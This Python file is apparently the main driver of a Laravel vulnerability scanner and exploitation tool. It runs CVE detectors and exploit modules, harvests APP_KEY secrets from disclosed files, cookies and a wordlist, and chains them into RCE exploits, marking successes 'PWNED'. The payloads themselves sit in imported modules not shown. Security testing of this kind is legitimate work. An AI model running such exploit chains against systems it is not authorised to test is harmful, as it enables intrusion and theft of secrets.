#!/usr/bin/env python3
import argparse
import inspect
import json
import os
import requests
from datetime import datetime
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

from modules.core import http_config
from modules.core.http_config import normalize_base
from modules.probes.response_memo import reset_run_memo
from modules.detection.detect_laravel import is_laravel, discover_resources
from modules.registry.exploit import (
    CVE_META,
    SEV_RANK,
    cves_by_criticality,
    _import_exploit,
    version_suppresses,
    scope_of,
    APP_KEY_PRODUCERS,
)
from modules.registry.detect import get_detectors, _import_detector
from modules.registry import requires_component_map
from modules.cves import import_scan
from modules.helpers.pipeline import (
    PipelineContext,
    detection_verdict,
    is_confirmed_detection,
    normalize_detection_result,
    normalize_exploit_result,
)

# Static lookup: CVE ID -> required component name (from detect_registry requires_component field).
# Used by run_exploitation() to gate Livewire / Reverb CVEs when discover_resources() confirms
# the component absent (all probe URLs returned 404). Fail-open: CVEs NOT in this dict are never
# gated. Built once at import from the canonical registry so the exploit path uses the same
# requires_component data as the detect-all path — no duplication.
_CVE_REQUIRES_COMPONENT: dict = requires_component_map()

def show_banner():
    print(f"""
{Fore.CYAN}{Style.BRIGHT}══════════════════════════════════════════════════════════════════════
                                                                                             
    {Fore.RED}██╗      █████╗ ██████╗  █████╗ ██╗   ██╗███████╗██╗                           
    {Fore.RED}██║     ██╔══██╗██╔══██╗██╔══██╗██║   ██║██╔════╝██║                           
    {Fore.RED}██║     ███████║██████╔╝███████║██║   ██║█████╗  ██║                           
    {Fore.RED}██║     ██╔══██║██╔══██╗██╔══██║╚██╗ ██╔╝██╔══╝  ██║                           
    {Fore.RED}███████╗██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████╗                      
    {Fore.RED}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝                      
                                                                                             
              {Fore.YELLOW} VULNERABILITY SCANNER                           	      
                                                                                             
         {Fore.GREEN} Developed by: Mickoe and James                                                                                     
         {Fore.MAGENTA} Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}          
                                                                                             
    {Fore.WHITE}         Laravel Security Assessment Tool                               
                                                                                             
{Fore.CYAN}══════════════════════════════════════════════════════════════════════{Style.RESET_ALL}
    """)


def print_separator():
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")


def print_status(message, status_type="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    # (colour, tag) per status; flush=True so output stays real-time when stdout is piped/redirected
    # (default print() block-buffers a non-TTY, making the scan look stalled between lines).
    _styles = {
        "info":     (Fore.BLUE,    "[•]"),
        "success":  (Fore.GREEN,   "[•]"),
        "warning":  (Fore.YELLOW,  "[!]"),
        "critical": (Fore.RED,     "[CRITICAL]"),
        "high":     (Fore.MAGENTA, "[HIGH]"),
        "error":    (Fore.RED,     "[✗]"),
    }
    colour, tag = _styles.get(status_type, _styles["info"])
    print(f"{Fore.CYAN}[{timestamp}] {colour}{tag} {Fore.WHITE}{message}{Style.RESET_ALL}", flush=True)


# Path suffixes that are dashboard/probe endpoints, NOT app roots. If a user
# points the scanner at one of these (e.g. http://host/pulse), the app_url()
# helper treats the whole URL as the app root and re-appends the probe path
# (-> /pulse/pulse -> 404), so detectors silently miss. We warn but never
# auto-strip: normalize_base deliberately supports legitimate subpath mounts,
# and an app genuinely mounted at /pulse must still be scannable.
_KNOWN_PROBE_SUFFIXES = (
    "/pulse", "/telescope", "/horizon", "/nova", "/livewire",
    "/admin", "/filament", "/_debugbar",
)


def _warn_if_deep_link(target_url):
    """Warn if target_url's path ends in a known dashboard/probe endpoint, which
    usually means the app root (one level up) was intended. Non-mutating."""
    from urllib.parse import urlparse

    path = (urlparse(target_url).path or "").rstrip("/")
    for suffix in _KNOWN_PROBE_SUFFIXES:
        if path.lower().endswith(suffix):
            app_root = target_url.rstrip("/")[: -len(suffix)] or target_url
            print_status(
                f"Target path ends in '{suffix}', which is a dashboard/probe endpoint, "
                f"not an app root. Detectors append their own probe paths, so this "
                f"likely double-nests (e.g. {suffix}{suffix}) and misses. If the app "
                f"root is one level up, pass: {app_root}",
                "warning",
            )
            return True
    return False


def print_vulnerability_details(title, details, indent="  "):
    print(f"{indent}{Fore.YELLOW}📍 {title}:{Style.RESET_ALL}")
    for key, value in details.items():
        if key == "variables" and isinstance(value, list):
            value = ', '.join(value)
        elif key == "detected_strings" and isinstance(value, list):
            value = ', '.join(value)
        elif isinstance(value, list):
            value = ', '.join(map(str, value))
        print(f"{indent}  {Fore.CYAN}{key.replace('_', ' ').title()}:{Style.RESET_ALL} {Fore.WHITE}{value}{Style.RESET_ALL}")


_SEV_STATUS = {"Critical": "critical", "High": "high", "Medium": "warning", "Low": "info", "None": "info"}


def _print_laravel_details(laravel_info):
    """Render the 'Laravel Framework Details' block from a laravel_info dict — version, ecosystem,
    security indicators, and a clean PER-COOKIE breakdown (name/secure/httponly/samesite) instead of a
    raw one-line dict dump. Shared by BOTH the detect-all (main) and exploit (run_exploitation) paths so
    the operator sees the same recon detail in either mode. Pure rendering — no new requests."""
    if not laravel_info:
        return
    details = {
        "url": laravel_info.get("url"),
        "http_status": laravel_info.get("status_code"),
        "php_version": laravel_info.get("php_version") or "unknown",
        "laravel_version_guess": laravel_info.get("laravel_version_guess") or "unknown",
        "composer_framework_version": laravel_info.get("composer_framework_version") or "not exposed",
        "composer_lock_version": laravel_info.get("composer_lock_version") or "not exposed",
        "ecosystem": laravel_info.get("ecosystem") or [],
        "vendor_exposed": "yes" if laravel_info.get("vendor_exposed") else "no",
        "env_exposed": "yes" if laravel_info.get("env_exposed") else "no",
        "indicators": laravel_info.get("indicators") or [],
    }
    print_vulnerability_details("Laravel Framework Details", details)
    cookies = laravel_info.get("cookies") or []
    if cookies:
        print(f"    {Fore.CYAN}Cookies:{Style.RESET_ALL}")
        _labels = [("name", "Name"), ("secure", "Secure"), ("httponly", "HttpOnly"), ("samesite", "SameSite")]
        for i, c in enumerate(cookies, 1):
            print(f"      {Fore.YELLOW}Cookie #{i}:{Style.RESET_ALL}")
            for key, label in _labels:
                print(f"        {Fore.CYAN}{label}:{Style.RESET_ALL} {Fore.WHITE}{c.get(key)}{Style.RESET_ALL}")


def _run_app_root_disclosure(target_url, laravel_info, loot):
    """Run the whole-app-root static-disclosure harvester and surface it in the EXPLOIT path.

    The harvester is a detection-registry probe (it shows automatically in detect-only runs),
    but it is the single most impactful finding on a server whose document root resolves to the
    application root instead of public/ — the entire source tree, config, dependency lockfile,
    SQLite database, and .env become downloadable. The exploit path doesn't iterate the detection
    registry, so without this the operator running --exploit would never see it. We run it once
    here (after recon), render the disclosed-file inventory, and seed any harvested APP_KEY into
    the run loot so it can auto-chain into app_key-gated CVEs. Read-only; never raises.

    Returns the finding dict (or None). Idempotent w.r.t. loot: only seeds app_key if unset.
    """
    try:
        from modules.detection.app_root_disclosure import scan as _ar_scan
        finding = _ar_scan(target_url, laravel_info=laravel_info)
    except Exception:
        return None
    if not finding:
        return None
    files = finding.get("exposed_files") or []
    print_status(
        f"Application-root static disclosure: {finding.get('exposed_count', len(files))} "
        f"sensitive file(s), {finding.get('total_bytes', 0)} bytes exfiltrable "
        f"({', '.join(finding.get('exposed_kinds') or [])})", "critical")
    _detail = {
        "url": finding.get("url"),
        "exposed_count": finding.get("exposed_count"),
        "total_bytes": finding.get("total_bytes"),
        "reason": finding.get("reason"),
        "files": [f"{e['size']}B  {e['kind']:<9} {e['path']}" for e in files],
    }
    print_vulnerability_details("Application-root disclosure", _detail)
    _akey = (finding.get("artifacts") or {}).get("app_key")
    if _akey and loot is not None and "app_key" not in loot:
        loot["app_key"] = _akey
        loot["app_key_source_cve"] = "app_root_disclosure"
        print_status(
            "APP_KEY harvested from application-root disclosure — "
            "available to auto-chain into app_key-gated CVEs", "warning")
    return finding


def _set_loot_app_key(loot, app_key, source, *, cve=None, detail=None):
    if not app_key or loot is None or loot.get("app_key"):
        return False
    loot["app_key"] = app_key
    loot["app_key_source_cve"] = source
    prefix = f"{cve}: " if cve else ""
    suffix = f" ({detail})" if detail else ""
    print_status(
        f"{prefix}APP_KEY harvested from {source}{suffix} — chaining into APP_KEY-gated exploit",
        "warning",
    )
    return True


def _cookies_from_detection(det):
    """Extract [{'name','value'}] cookie pairs from a detection result's artifacts.

    Cookie-deserialization detectors (e.g. CVE-2024-55556/48987) fetch encrypted-envelope cookies
    (XSRF-TOKEN / laravel_session) during scan() and stash the raw `Set-Cookie` headers in
    artifacts (session_driver_probe.responses[].set_cookie). Under targeted `--cve` minimal recon
    laravel_info carries no cookies, so this is the only captured envelope material available for
    offline wordlist-HMAC recovery. Parsing only — no HTTP. Returns [] on anything unexpected."""
    out = []
    arts = (det or {}).get("artifacts") or {}
    probe = arts.get("session_driver_probe")
    if isinstance(probe, str):
        try:
            import ast as _ast
            probe = _ast.literal_eval(probe)
        except Exception:
            probe = None
    set_cookie_strs = []
    if isinstance(probe, dict):
        for resp in probe.get("responses") or []:
            sc = resp.get("set_cookie") if isinstance(resp, dict) else None
            if sc:
                set_cookie_strs.append(sc)
    # also accept a generic artifacts["cookies"] already in {name,value} form
    for c in arts.get("cookies") or []:
        if isinstance(c, dict) and c.get("name"):
            out.append({"name": c["name"], "value": c.get("value")})
    for sc in set_cookie_strs:
        # "NAME=VALUE; Path=/; HttpOnly" -> {name:NAME, value:VALUE}
        head = str(sc).split(";", 1)[0].strip()
        if "=" in head:
            name, _, value = head.partition("=")
            if name and value:
                out.append({"name": name.strip(), "value": value.strip()})
    return out


def _recover_app_key(
    target_url,
    laravel_info,
    loot,
    *,
    session=None,
    cve=None,
    det=None,
    username=None,
    password=None,
    options=None,
):
    """Best-effort standard APP_KEY recovery before an APP_KEY-gated exploit.

    Runs whenever an APP_KEY-gated CVE is selected and no operator (`--app-key`) or already-chained
    key is available — independent of exploit policy. It NEVER uses a lab-pinned/injected key; it
    only goes through the standard public/leaked/default workflow: cached/observed cookies are
    checked offline against the vendored APP_KEY wordlist (modules/probes/data/appkey_wordlist.txt),
    APP_KEY-producing detection modules are asked for leak artifacts, and exploit-mode CVE producer
    methods are tried in secrets-only mode where the module supports it. Never raises.
    A target whose APP_KEY is freshly `php artisan key:generate`'d (not in any wordlist, not leaked)
    correctly does NOT recover — recovery expands surface to the key-reuse/leak population only.
    """
    if loot is None or loot.get("app_key"):
        return False

    try:
        from modules.probes.appkey_recovery import recover_app_key
        recovered = recover_app_key(
            target_url,
            laravel_info=laravel_info,
            session=session,
            detection=det,
            username=username,
            password=password,
            options=options or {},
            include_live_cookie=True,
            include_detection_producers=True,
            include_cve_methods=True,
            active_module=cve,
        )
    except Exception:
        recovered = None

    if recovered and recovered.get("app_key"):
        return _set_loot_app_key(
            loot,
            recovered["app_key"],
            recovered.get("source") or "appkey-recovery",
            cve=cve,
            detail=recovered.get("detail") or recovered.get("method"),
        )

    return False


def _advisory_laravel_info(target_url):
    """Minimal probe-state carrier when the framework fingerprint is inconclusive."""
    return {
        "url": target_url,
        "final_url": target_url,
        "status_code": None,
        "php_version": None,
        "laravel_version_guess": "unknown",
        "composer_framework_version": None,
        "composer_lock_version": None,
        "ecosystem": [],
        "vendor_exposed": False,
        "env_exposed": False,
        "indicators": [],
        "cookies": [],
        "components": [],
    }


def _print_cve_list():
    """Print every exploit-capable CVE ranked by Independent severity (col G of the xlsx)."""
    print_status("Exploit-capable CVEs (ranked by Independent severity):", "info")
    print()
    cur_sev = None
    for cve in cves_by_criticality():
        sev, vclass, cmd_cap, auth_req, key_req = CVE_META[cve]
        if sev != cur_sev:
            print_status(f"=== {sev} ===", _SEV_STATUS.get(sev, "info"))
            cur_sev = sev
        flags = []
        if cmd_cap:
            flags.append("--command")
        if auth_req:
            flags.append("-U/-P")
        if key_req:
            flags.append("--app-key")
        flag_s = (" [" + ", ".join(flags) + "]") if flags else ""
        print(f"    {Fore.YELLOW}{cve}{Style.RESET_ALL}  {Fore.CYAN}{vclass}{Style.RESET_ALL}{flag_s}")
    print()
    print_status(f"{len(CVE_META)} exploit-capable CVEs. Use --cve <ID> --exploit to run one.", "info")


def _print_exploit_result(cve, res):
    """Render a single exploit() result dict (per the exploit contract)."""
    reported_cve = res.get("reattributed_cve") or cve
    sev = CVE_META.get(reported_cve, CVE_META.get(cve, ("None",)))[0]
    vclass = res.get("vuln_class", "?")
    label = reported_cve
    if reported_cve != cve:
        label = f"{reported_cve} (via {cve} module)"
    if res.get("success"):
        # `outcome` (optional): a precise, honest headline of WHAT WAS DEMONSTRATED,
        # used in place of the bare vuln_class. Needed when the proven outcome is
        # narrower than the CVE's class — e.g. an RCE-class callable-injection bug
        # whose reachable demonstration is secret disclosure, not command exec.
        # A bare "EXPLOITED (rce)" over a config dump misleads (RCE reads as
        # "ran a command"); `outcome` lets the module say exactly what happened.
        outcome = res.get("outcome")
        headline = outcome if outcome else f"EXPLOITED ({vclass})"
        print_status(f"{label} {headline} — {sev}", "critical")
    elif res.get("oob_pending"):
        # OOB-PENDING: the module did its part end-to-end (e.g. delivered + consumed a deserialization
        # gadget), but the proof is out-of-band — the tool cannot observe command output over HTTP, so
        # `success` stays False. This is categorically different from "not successful": the exploit
        # primitive fired; the operator just reads the result from their OOB collector (interactsh,
        # worker stdout, side-effect file). See res['reason'] for exactly where to look.
        # Use a neutral status tag (not "high"/"critical") so the "[•]" marker isn't misread as a
        # severity claim — the CVE's own severity is shown separately; this line is about outcome state.
        print_status(f"{label} attempted ({vclass}) — exploit delivered; verify result out-of-band", "warning")
    elif res.get("attempted"):
        print_status(f"{label} attempted ({vclass}) — not successful", "warning")
    else:
        print_status(f"{label} not exploitable ({vclass})", "info")
    details = {"detail": res.get("detail") or "", "vuln_class": vclass}
    if reported_cve != cve:
        details["invoked_cve"] = cve
        details["reported_cve"] = reported_cve
    # `impact` (optional): a plain-language statement of what was actually proven
    # vs. the broader vuln class — e.g. for a callable-invocation RCE that
    # discloses APP_KEY rather than running argv, this is where the module spells
    # out "config/secret disclosure = RCE-class, argv shell-exec not via this sink".
    if res.get("impact"):
        details["impact"] = res["impact"]
    # `note` (optional): module-supplied caveat/attribution the operator MUST see —
    # e.g. "this RCE is really the CVE-2025-14894 filemanager sink, not the 47823
    # MIME-bypass; reported as 14894". Previously set by modules but never rendered,
    # so the on-screen headline silently over-attributed the win. Surface it.
    if res.get("note"):
        details["note"] = res["note"]
    if res.get("evidence"):
        ev = str(res["evidence"])
        details["evidence"] = ev if len(ev) <= 800 else ev[:800] + " ...[truncated]"
    if res.get("requires"):
        details["requires"] = res["requires"]
    if res.get("reason"):
        details["reason"] = res["reason"]
    if res.get("artifacts"):
        details["artifacts"] = res["artifacts"]
    print_vulnerability_details(f"{label} exploit result", details)
    print()


_SCAN_DETAIL_KEYS = (
    "vulnerable", "detected", "status", "verdict", "proof_type", "proof",
    "preconditions", "risk", "severity", "version", "version_status",
    "endpoint", "url", "filemanager_url",
    "livewire_update_url", "upload_component_url", "http_status",
    "signed_upload_url", "suppressed", "suppression_reason", "probe_note",
    "reason", "note", "evidence", "requires", "artifacts",
)


def _compact_detail_value(value, *, limit=800):
    """Keep detector detail rendering useful without dumping huge HTML/JSON blobs."""
    if isinstance(value, str):
        return value if len(value) <= limit else value[:limit] + " ...[truncated]"
    if isinstance(value, list):
        out = []
        for item in value[:8]:
            item_s = str(item)
            out.append(item_s if len(item_s) <= 220 else item_s[:220] + " ...[truncated]")
        if len(value) > 8:
            out.append(f"... {len(value) - 8} more")
        return out
    if isinstance(value, dict):
        out = {}
        for i, (k, v) in enumerate(value.items()):
            if i >= 12:
                out["..."] = f"{len(value) - 12} more"
                break
            v_s = str(v)
            out[k] = v if len(v_s) <= 220 else v_s[:220] + " ...[truncated]"
        return out
    return value


def _scan_detail_view(res) -> dict:
    """Return the operator-facing subset of a detector result dict."""
    if not isinstance(res, dict):
        return {}
    details = {}
    for key in _SCAN_DETAIL_KEYS:
        if key in res and res.get(key) not in (None, "", [], {}):
            details[key] = _compact_detail_value(res.get(key))
    return details


def _print_scan_result(cve, res, det_flag, *, targeted=False):
    """Render scan() details for targeted CVE runs.

    Detect-only targeted runs are the operator's "detection phase"; hiding the
    detector envelope there makes patched/negative decisions look like silence.
    Full exploit-all runs stay compact by default.
    """
    if not targeted:
        return
    details = _scan_detail_view(res)
    if not details:
        return
    details = {"scan_status": det_flag, **details}
    print_vulnerability_details(f"{cve} scan result", details)
    print()


def _summary_mark(item, *, do_exploit, outcome_tags=None, oob_pending_cves=None):
    """Build the final summary cell for one CVE.

    The summary is the operator's pipeline ledger: always show the detection
    verdict, and add exploitation outcome only when the run attempted that phase.
    """
    outcome_tags = outcome_tags or {}
    oob_pending_cves = oob_pending_cves or set()
    cve = item["cve"]
    reported_cve = item.get("reported_cve") or cve
    scan_mark = item.get("scan", "not run")
    scan_label = "scan"
    if reported_cve != cve:
        scan_label = f"scan({cve})"
    if not do_exploit:
        return f"{scan_label}: {Fore.CYAN}{scan_mark}{Style.RESET_ALL}"

    attempted = item.get("attempted", False)
    success = item.get("success", False)
    if success:
        tag = item.get("outcome_tag") or outcome_tags.get(cve) or outcome_tags.get(reported_cve)
        exploit_mark = (f"{Fore.RED}{tag.upper()}{Style.RESET_ALL}" if tag
                        else f"{Fore.RED}EXPLOITED{Style.RESET_ALL}")
    elif cve in oob_pending_cves or reported_cve in oob_pending_cves:
        exploit_mark = f"{Fore.MAGENTA}attempted (verify OOB){Style.RESET_ALL}"
    elif attempted:
        exploit_mark = f"{Fore.YELLOW}attempted{Style.RESET_ALL}"
    else:
        exploit_mark = f"{Fore.BLUE}n/a{Style.RESET_ALL}"
    return f"{scan_label}: {Fore.CYAN}{scan_mark}{Style.RESET_ALL} | exploit: {exploit_mark}"


def _summary_identity(item):
    """Return display CVE/severity/class plus provenance for a summary row."""
    invoked_cve = item["cve"]
    reported_cve = item.get("reported_cve") or invoked_cve
    meta = CVE_META.get(reported_cve)
    if meta:
        sev, vclass = meta[0], meta[1]
    else:
        sev, vclass = item["sev"], item["vclass"]
    via_note = ""
    if reported_cve != invoked_cve:
        via_note = f"  {Fore.MAGENTA}[via {invoked_cve}]{Style.RESET_ALL}"
    return reported_cve, sev, vclass, via_note


def _scan_is_hit(scan_mark) -> bool:
    """True iff a summary row's scan verdict is a confirmed vulnerability."""
    return is_confirmed_detection(scan_mark)


def _provided_or(value, fallback=None):
    """Return operator-supplied values verbatim; use fallback only for truly absent None.

    Empty strings are intentional input (`-U '' -P ''`) and must not be treated as missing.
    """
    return value if value is not None else fallback


_AUTO_CHAINABLE_SCAN_VERDICTS = {"version_applicable", "precondition_detected", "sink_reachable"}


def _auto_chain_allowed(
    *,
    only_cve,
    det_flag,
    exploit_fn,
    cmd_cap,
    vclass,
    auth_req,
    key_req,
    resolved_username,
    resolved_password,
    shared_session,
    operator_app_key_present,
    loot,
) -> tuple[bool, str]:
    """Allow targeted RCE exploit modules to prove chainable precondition hits.

    This keeps broad scans conservative, but lets `--cve X --exploit` do the useful thing for
    conditional RCEs where detection can only establish version/preconditions and exploit() is the
    confirmation step.
    """
    verdict = str(det_flag or "")
    if not only_cve or exploit_fn is None:
        return False, ""
    if verdict not in _AUTO_CHAINABLE_SCAN_VERDICTS:
        return False, ""
    if verdict == "sink_reachable" and str(vclass or "").lower() == "mass_assignment":
        return True, (
            "targeted mass-assignment module with reachable sink; "
            "running exploit as confirmation"
        )
    if not cmd_cap or "rce" not in str(vclass or "").lower():
        return False, ""
    if auth_req and not (shared_session is not None or (resolved_username and resolved_password)):
        return False, "auth material missing"
    if key_req and not (
        operator_app_key_present
        or loot.get("app_key")
    ):
        return False, "APP_KEY material missing"
    return True, (
        f"targeted command-capable RCE module with scan verdict {verdict}; "
        "running exploit as confirmation"
    )


def _row_emphasis(item, *, do_exploit, oob_pending_cves=None) -> str:
    """Classify a summary row for the highlight renderer: 'hit' | 'normal' | 'dim'.

    detect-only: the scan verdict is the signal. confirmed_vulnerable -> hit; everything else
    (candidate, surface-only, version-only, not detected, skipped, suppressed) -> dim.

    exploit: the EXPLOIT OUTCOME is the signal (per operator request — EXPLOITED loud, only n/a
    dimmed):
      - success (EXPLOITED / tagged)            -> hit   (loudest: a confirmed compromise)
      - attempted, incl. 'verify OOB' (pending) -> normal (the working set; stays readable)
      - n/a (no exploit attempted — scan negative & policy didn't force) -> dim (pure noise)
    """
    oob_pending_cves = oob_pending_cves or set()
    if not do_exploit:
        return "hit" if _scan_is_hit(item.get("scan")) else "dim"
    if item.get("success"):
        return "hit"
    if item.get("attempted"):
        return "normal"
    cve = item["cve"]
    reported_cve = item.get("reported_cve") or cve
    if cve in oob_pending_cves or reported_cve in oob_pending_cves:
        return "normal"   # attempted (verify OOB) — pending, keep visible
    return "dim"          # n/a — exploit never ran


def _print_outcome_rollup(summary, oob_pending_cves=None, app_root_finding=None):
    """Print a generic outcome rollup beneath the exploit summary.

    Pure aggregation of the outcome fields already on each summary row — it makes NO
    applicability claim (a generic scanner can't tell "wrong product" from "right product,
    exploit failed"; that judgement is the operator's). Buckets:
      * exploited            — success=True
      * detected, not exploited — scan detected but exploit did not land
      * skipped (gated)      — component/sink confirmed absent (row carries a probe/skip note)
      * attempted, no result — exploit ran, nothing landed
    The per-row detail above already explains each 'attempted' case; this is the at-a-glance
    tally so the operator sees the shape of the run without counting rows by hand.

    app_root_finding (optional): the app_root_disclosure result dict. Re-echoed here because
    it is NOT a CVE row (it prints during recon) and under --trace-http that line scrolls away
    behind the HTTP log — the operator must still see it at the end of their run."""
    if app_root_finding:
        _files = app_root_finding.get("exposed_files") or []
        _akey = (app_root_finding.get("artifacts") or {}).get("app_key")
        print_status(
            f"Application-root disclosure (non-CVE): {app_root_finding.get('exposed_count', len(_files))} "
            f"file(s), {app_root_finding.get('total_bytes', 0)} bytes exfiltrable "
            f"({', '.join(app_root_finding.get('exposed_kinds') or [])})"
            + (f"; APP_KEY recovered" if _akey else ""), "critical")
    oob_pending_cves = oob_pending_cves or set()
    exploited = detected = skipped = attempted = 0
    for r in summary:
        if r.get("success"):
            exploited += 1
        elif r.get("scan") and str(r.get("scan")).startswith("skipped"):
            skipped += 1
        elif r.get("attempted"):
            if _scan_is_hit(r.get("scan")):
                detected += 1
            else:
                attempted += 1
        elif _scan_is_hit(r.get("scan")):
            detected += 1
        else:
            skipped += 1
    print_status(
        f"Outcome rollup: {exploited} exploited · {detected} detected-not-exploited · "
        f"{attempted} attempted-no-result · {skipped} skipped/gated "
        f"(of {len(summary)} CVE rows). Per-row detail above explains each result; this "
        f"tally makes no applicability claim.", "info")


def _print_summary(summary, *, do_exploit, outcome_tags=None, oob_pending_cves=None,
                   chained_cves=None, sort=False, headline_label="CVE", print_done=True,
                   highlight=False):
    """Render the ranked operator ledger — the SINGLE summary renderer for both the
    exploit pipeline (run_exploitation) and the detect-all path (main()).

    Keeping one renderer is deliberate: the detect-only summary must read "similar to
    exploitation results", and the only way to guarantee that beyond drift is to share the
    code. The exploit path calls with sort=False so its already-critical-first ordering (and
    therefore its output) is byte-for-byte unchanged; the detect-all path passes sort=True
    because its rows arrive in registry order, not severity order.

    highlight=True (detect-only path only): make positive detections pop — a bright-green
    verdict + a "► HIT" marker on detected rows, and DIM the non-hit rows (not detected /
    skipped / suppressed) so the eye lands on the hits in a long table. The exploit path leaves
    highlight=False so its summary stays byte-for-byte identical to before this feature.

    Each summary item is a dict with at least: cve, sev, vclass, scan, request_budget.
    Optional: reported_cve, attempted, success, outcome_tag, probe_note.
    """
    outcome_tags = outcome_tags or {}
    oob_pending_cves = oob_pending_cves or set()
    chained_cves = chained_cves or {}

    if sort:
        # Most-critical-first, mirroring cves_by_criticality (lower SEV_RANK = more severe).
        # Stable sort preserves registry order within a severity bucket.
        summary = sorted(
            summary,
            key=lambda it: SEV_RANK.get(_summary_identity(it)[1], 99),
        )

    print_separator()
    print_status("Summary (most critical first):", "info")
    popped = [s for s in summary if s.get("success")]
    if do_exploit:
        attempted_count = sum(1 for s in summary if s.get("attempted"))
        print_status(f"Exploited: {len(popped)} / {attempted_count} CVE(s) attempted "
                     f"({len(summary)} scanned).",
                     "critical" if popped else "info")
    else:
        confirmed_count = sum(1 for s in summary if _scan_is_hit(s.get("scan")))
        print_status(f"Confirmed vulnerable: {confirmed_count} / {len(summary)} {headline_label}(s) scanned.",
                     "critical" if confirmed_count else "info")
    for item in summary:
        invoked_cve = item["cve"]
        cve, sev, vclass, via_note = _summary_identity(item)
        mark = _summary_mark(
            item,
            do_exploit=do_exploit,
            outcome_tags=outcome_tags,
            oob_pending_cves=oob_pending_cves,
        )
        chain_note = ""
        if invoked_cve in chained_cves:
            chain_note = (f"  {Fore.MAGENTA}[chained: APP_KEY from "
                          f"{chained_cves[invoked_cve]}]{Style.RESET_ALL}")
        probe_note = ""
        if item.get("probe_note"):
            probe_note = f"  {Fore.BLUE}[probe: {item['probe_note']}]{Style.RESET_ALL}"

        budget = item.get("request_budget") or {}
        budget_note = ""
        if budget:
            budget_parts = []
            for _stage in ("detect", "exploit"):
                _v = budget.get(_stage)
                if isinstance(_v, int) and _v:
                    budget_parts.append(f"{_stage}={_v}")
            if budget_parts:
                budget_note = f"  {Fore.BLUE}[requests: {'/'.join(budget_parts)}]{Style.RESET_ALL}"

        # highlight: make the row that MATTERS pop and dim the noise. The "thing that matters"
        # differs by mode — detect-only keys on confirmed vulnerability, exploit keys on the
        # exploit outcome (EXPLOITED). The cell `mark` itself is built by _summary_mark (unchanged);
        # here we only add the leading marker + brighten/dim the WHOLE row. _summary_mark is left
        # untouched so any caller that passes highlight=False renders exactly as before.
        if highlight:
            _emphasis = _row_emphasis(item, do_exploit=do_exploit,
                                      oob_pending_cves=oob_pending_cves)
            _row_text = (f"[{sev:8s}] {cve} ({vclass}) -> "
                         f"{mark}{via_note}{chain_note}{probe_note}{budget_note}")
            if _emphasis == "hit":
                # Loudest: confirmed result (detected / EXPLOITED). Brighten the severity tag + CVE
                # id (which _summary_mark/identity didn't bold) and prepend a marker.
                _color = Fore.RED if do_exploit else Fore.GREEN
                _marker = ("►► " + f"{_color}{Style.BRIGHT}PWNED{Style.RESET_ALL}  ") if do_exploit \
                    else (f"► {_color}{Style.BRIGHT}CONFIRMED{Style.RESET_ALL}  ")
                print(f"    {_color}{Style.BRIGHT}[{sev:8s}]{Style.RESET_ALL} "
                      f"{Fore.YELLOW}{Style.BRIGHT}{cve}{Style.RESET_ALL} ({vclass}) -> "
                      f"{_marker}{mark}{via_note}{chain_note}{probe_note}{budget_note}")
            elif _emphasis == "dim":
                # Noise (a miss / skip / n-a): dim the whole line. Re-apply DIM after each embedded
                # reset so the inner-note resets don't cancel the dim mid-line.
                _line = ("    " + _row_text).replace(Style.RESET_ALL, Style.RESET_ALL + Style.DIM)
                print(f"{Style.DIM}{_line}{Style.RESET_ALL}")
            else:
                # "normal": the working set (an attempted-but-unconfirmed / verify-OOB row). Render
                # at full brightness with no marker — it neither pops nor recedes.
                print("    " + _row_text)
            continue

        print(f"    [{sev:8s}] {Fore.YELLOW}{cve}{Style.RESET_ALL} ({vclass}) -> "
              f"{mark}{via_note}{chain_note}{probe_note}{budget_note}")
    print_separator()
    if print_done:
        print_status("Done.", "success")


def _detector_candidate_kwargs(username, password, cve=None) -> dict:
    """Build the detect-all candidate kwargs by OPERATOR INTENT (auth-wiring spec, Section 1).

    The truthiness-trap-safe rule: a real authenticated session is offered ONLY when the operator
    supplied -H cookie/auth material (http_config.has_auth_headers()); otherwise session=None, so a
    detector's own `session or requests.Session()` / `session is not None` branch behaves exactly as
    it does on an unauthenticated run (no silent self-login suppression, no spurious authed-branch).
    username/password carry the resolved -U/-P (or LW_/SNIPE_ env) creds when supplied. The scanner
    never injects local lab credentials implicitly; run.sh files print any lab secrets explicitly.
    The per-detector signature filter (_accepted_kwargs) drops them where scan() doesn't accept them.

    Factored out of main()'s detect-all loop so the dispatch contract is unit-testable offline.
    """
    return {
        "session": http_config.get_auth_session() if http_config.has_auth_headers() else None,
        "username": username,
        "password": password,
    }


def _accepted_kwargs(fn, candidate: dict) -> dict:
    """Filter a candidate kwargs dict down to the params fn actually accepts (or all, if fn has
    **kwargs). Module scan()/exploit() signatures are heterogeneous — some take session, some
    username/password, some neither — so passing an unaccepted kwarg raises TypeError and would be
    misread as 'not exploitable'. Mirrors the detect-loop discipline (main()).
    """
    try:
        params = inspect.signature(fn).parameters
        if any(p.kind == p.VAR_KEYWORD for p in params.values()):
            return dict(candidate)
        return {k: v for k, v in candidate.items() if k in params}
    except (TypeError, ValueError):
        return {}


def _declares_app_key(fn) -> bool:
    """True iff fn's signature has an EXPLICIT `app_key` parameter (not a bare **kwargs catch-all).

    The loot-chain log must fire only for a consumer that genuinely consumes the key. A **kwargs
    consumer would have app_key forwarded by _accepted_kwargs yet silently discard it, so a
    membership check on the forwarded kwargs is not enough — we inspect the real parameter list.
    """
    try:
        return "app_key" in inspect.signature(fn).parameters
    except (TypeError, ValueError):
        return False


# APP_KEY producer/consumer sets for the detect-all loot-chain. Module-level (not main()-locals)
# so tests can import and iterate the REAL sets — see modules/detection/tests/test_loot_chain_*.
#
# TWO DISTINCT CONTRACTS — do not conflate with registry.exploit.APP_KEY_PRODUCERS:
#   * _DETECT_ALL_PRODUCERS (here): detectors that emit artifacts["app_key"] from scan() (detection
#     phase). cve_2025_49132 joins this set because its scan confirms the traversal primitive before
#     surfacing config/app.php APP_KEY disclosure; cve_2023_43661 still discloses in exploit().
#   * registry.exploit.APP_KEY_PRODUCERS: the EXPLOIT-path set (emit in exploit()), which correctly
#     includes 2025_49132 / 2023_43661 / 2024_55661. The two sets legitimately differ by phase.
_DETECT_ALL_PRODUCERS = {"env", "cve_2017_16894", "app_root_disclosure", "cve_2025_49132"}
